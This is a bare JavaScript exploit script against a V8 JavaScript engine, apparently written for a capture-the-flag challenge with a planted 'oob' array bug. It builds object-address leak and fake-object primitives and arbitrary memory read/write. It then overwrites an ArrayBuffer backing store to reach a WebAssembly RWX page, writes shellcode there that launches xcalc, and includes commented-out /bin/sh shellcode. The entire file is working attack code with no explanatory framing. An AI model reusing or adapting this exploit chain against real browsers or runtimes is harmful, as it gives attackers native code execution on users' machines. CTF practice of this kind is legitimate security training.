var buff = new ArrayBuffer(0x10);
var int_area = new BigUint64Array(buff);
var flo_area = new Float64Array(buff);

function ftoi(floatt){
    flo_area[0] = floatt;
    return int_area[0];
}

function itof(intt){
    int_area[0] = intt;
    return flo_area[0];
}

function itos(intt){
    return '0x'+intt.toString(16);
}

var a = {'A':1};
var obj_all = [a,a];
var float_all = [1,2,3,4.4];
var obj_map = obj_all.oob();
var float_map = float_all.oob();

function leak_obj(obj_put){
    obj_all[0] = obj_put;
    obj_all.oob(float_map);
    let leak_addr = obj_all[0];
    obj_all.oob(obj_map);
    return ftoi(leak_addr);
}

function fake_obj(obj_put){
    float_all[0] = itof(obj_put);
    float_all.oob(obj_map);
    let fake_addr = float_all[0];
    float_all.oob(float_map);
    return fake_addr;
}

var vul = [float_map,2.2,3,4];

function read_all(read_addr){
    let leak_addr = leak_obj(vul);
    leak_addr -= 0x20n;
    var fake_ = fake_obj(leak_addr);
    vul[2] = itof(read_addr-0x10n);
    return ftoi(fake_[0]);
}

function write_all(des_addr,write_data){
    let leak_addr = leak_obj(vul);
    leak_addr -= 0x20n;
    let fake_ = fake_obj(leak_addr);
    vul[2] = itof(des_addr-0x10n);
    fake_[0] = itof(write_data);
}

var new_buff = new ArrayBuffer(0x100);
var dataview = new DataView(new_buff);
var shellcode1=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
var shellcode2 = [
    0x2fbb485299583b6an,
    0x5368732f6e69622fn,
    0x050f5e5457525f54n
];

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var f = wasmInstance.exports.main;
var leak_f = leak_obj(f);
var data1 = read_all(leak_f+0x18n);
var data2 = read_all(data1+0x8n);
var data3 = read_all(data2+0x10n);
var rwx_addr = read_all(data3+0x88n);

var back_store = leak_obj(new_buff);
back_store += 0x20n;
write_all(back_store,rwx_addr);

for(var i=0;i<shellcode1.length;i++){
    dataview.setUint32(i*4,shellcode1[i],true);
}

//for(var i=0;i<shellcode2.length;i++){
//    dataview.setBigUint64(i*8,shellcode2[i],true);
//}

f();

//%DebugPrint(vul);
//%SystemBreak();